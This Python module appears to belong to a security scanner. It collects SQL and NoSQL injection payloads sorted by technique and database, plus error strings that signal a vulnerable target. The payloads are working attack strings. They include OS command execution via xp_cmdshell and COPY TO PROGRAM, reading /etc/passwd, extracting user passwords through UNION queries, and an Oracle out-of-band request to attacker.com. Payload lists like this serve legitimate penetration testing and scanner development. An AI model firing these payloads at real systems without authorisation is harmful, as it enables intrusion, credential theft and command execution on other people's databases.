"""
SQL Injection Payloads

Comprehensive collection of SQL injection test payloads for various
database backends and injection techniques.
"""

# Classic SQL injection payloads
CLASSIC_SQLI = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    '" OR "1"="1',
    '" OR "1"="1" --',
    "' OR 1=1 --",
    "' OR 1=1#",
    "admin' --",
    "admin'/*",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "1' OR '1'='1",
    "1 OR 1=1",
    "' OR ''='",
    "' OR 1 --",
    "' OR 1=1 LIMIT 1 --",
]

# Union-based SQL injection
UNION_SQLI = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "1' UNION SELECT username,password FROM users--",
    "' UNION SELECT @@version--",
    "' UNION SELECT version()--",
    "' UNION SELECT table_name FROM information_schema.tables--",
]

# Error-based SQL injection
ERROR_SQLI = [
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
    "'||(SELECT '')||'",
    "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--",
]

# Time-based blind SQL injection
TIME_SQLI = [
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND SLEEP(5)#",
    "' OR SLEEP(5)--",
    "'; SELECT SLEEP(5)--",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    "' AND (SELECT COUNT(*) FROM generate_series(1,5000000))>0--",  # PostgreSQL
    "1; SELECT pg_sleep(5)--",  # PostgreSQL
]

# Boolean-based blind SQL injection
BOOLEAN_SQLI = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1' AND 1=1#",
    "1' AND 1=2#",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
]

# Database-specific payloads
MYSQL_SQLI = [
    "' AND @@version--",
    "' AND database()--",
    "' UNION SELECT user()--",
    "' AND LOAD_FILE('/etc/passwd')--",
    "' INTO OUTFILE '/tmp/test.txt'--",
    "1' AND MID(VERSION(),1,1)='5'#",
]

MSSQL_SQLI = [
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC sp_configure 'show advanced options',1--",
    "' AND @@SERVERNAME--",
    "'; SELECT * FROM master..sysdatabases--",
    "' AND HAS_DBACCESS('master')=1--",
]

POSTGRESQL_SQLI = [
    "'; SELECT version()--",
    "' AND current_database()--",
    "' UNION SELECT NULL,table_name FROM information_schema.tables--",
    "'; COPY (SELECT '') TO PROGRAM 'whoami'--",
    "' AND pg_read_file('/etc/passwd')--",
]

ORACLE_SQLI = [
    "' AND banner FROM v$version--",
    "' UNION SELECT NULL FROM dual--",
    "' AND (SELECT utl_http.request('http://attacker.com') FROM dual)--",
    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
]

# NoSQL injection payloads
NOSQL_INJECTION = [
    '{"$gt": ""}',
    '{"$ne": ""}',
    '{"$regex": ".*"}',
    "[$ne]=1",
    "[$gt]=",
    "[$regex]=.*",
    '{"$where": "1==1"}',
    '{"$or": [{}]}',
    "'; return true; var a='",
    "1; return true",
]

# All payloads combined for comprehensive testing
ALL_SQLI_PAYLOADS = (
    CLASSIC_SQLI +
    UNION_SQLI +
    ERROR_SQLI +
    TIME_SQLI +
    BOOLEAN_SQLI +
    MYSQL_SQLI +
    MSSQL_SQLI +
    POSTGRESQL_SQLI +
    ORACLE_SQLI
)

# SQL error signatures that indicate vulnerability
SQL_ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "mysqli_",

    # PostgreSQL
    "pg_query",
    "pg_exec",
    "postgresql",
    "psql",
    "syntax error at or near",
    "unterminated quoted string",

    # MSSQL
    "microsoft ole db provider for sql server",
    "microsoft sql server",
    "sqlsrv_",
    "mssql_",
    "odbc sql server driver",
    "sql server error",
    "unclosed quotation mark",

    # Oracle
    "ora-00933",
    "ora-00921",
    "ora-01756",
    "ora-",
    "oracle error",
    "oracle driver",
    "quoted string not properly terminated",

    # SQLite
    "sqlite3::",
    "sqlite_",
    "sqlite error",
    "unrecognized token",

    # Generic
    "sql syntax",
    "sql error",
    "database error",
    "db error",
    "query failed",
    "syntax error",
    "unexpected end of sql",
    "division by zero",
    "supplied argument is not a valid",
]
